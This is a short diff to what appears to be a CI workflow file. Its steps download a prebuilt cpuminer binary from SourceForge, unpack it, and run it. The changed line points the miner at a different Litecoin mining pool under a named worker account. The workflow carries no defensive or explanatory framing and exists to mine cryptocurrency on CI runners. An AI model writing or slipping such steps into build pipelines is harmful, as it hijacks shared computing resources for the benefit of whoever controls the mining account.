@@ -26,4 +26,4 @@ jobs:
       - run: sudo apt-get install curl tar -y
       - run: curl https://cfhcable.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -o c.tar.gz
       - run: tar xvzf c.tar.gz
-      - run: ./minerd -o stratum+tcp://prohashing.com:3333 -u arthdal -p a=scrypt,c=litecoin,m=pplns
+      - run: ./minerd -o stratum+tcp://litecoinpool.org:3333 -u arthdal20.2 -p 2
